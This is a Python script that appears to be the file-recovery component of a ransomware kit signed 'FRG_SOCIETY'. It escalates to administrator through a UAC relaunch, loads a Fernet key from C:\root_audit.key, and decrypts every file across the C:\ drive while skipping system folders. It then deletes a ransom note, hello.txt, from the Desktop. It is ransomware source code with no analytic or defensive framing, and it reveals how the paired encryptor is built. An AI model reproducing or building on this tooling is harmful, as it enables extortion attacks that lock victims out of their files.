import os
import sys
import ctypes
from cryptography.fernet import Fernet
from rich.console import Console

console = Console()

def es_administrador():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

def decrypt_system():
    key_path = "C:\\root_audit.key"
    
    if not os.path.exists(key_path):
        console.print(f"[bold red][!] Key not found: {key_path}[/bold red]")
        return

    try:
        with open(key_path, "rb") as f:
            key = f.read()
        f_cipher = Fernet(key)
    except:
        return

    for raiz, dirs, archivos in os.walk("C:\\"):
        if any(x in raiz for x in ["Windows", "Program Files", "AppData"]):
            continue
            
        for archivo in archivos:
            if archivo == "root_audit.key" or archivo == "hello.txt":
                continue
            
            ruta = os.path.join(raiz, archivo)
            
            try:
                with open(ruta, "rb") as f_in:
                    datos_cifrados = f_in.read()
                
                datos_originales = f_cipher.decrypt(datos_cifrados)
                
                with open(ruta, "wb") as f_out:
                    f_out.write(datos_originales)
                
                console.print(f"[bold blue][RECOVERY][/bold blue] {archivo}")
            except:
                pass

    limpiar_rastro()

def limpiar_rastro():
    escritorio = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    ruta_nota = os.path.join(escritorio, "hello.txt")
    
    if os.path.exists(ruta_nota):
        try: os.remove(ruta_nota)
        except: pass

    console.print("\n[bold cyan]--- SYSTEM RESTORED BY FRG_SOCIETY ---[/bold cyan]")
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    if es_administrador():
        decrypt_system()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)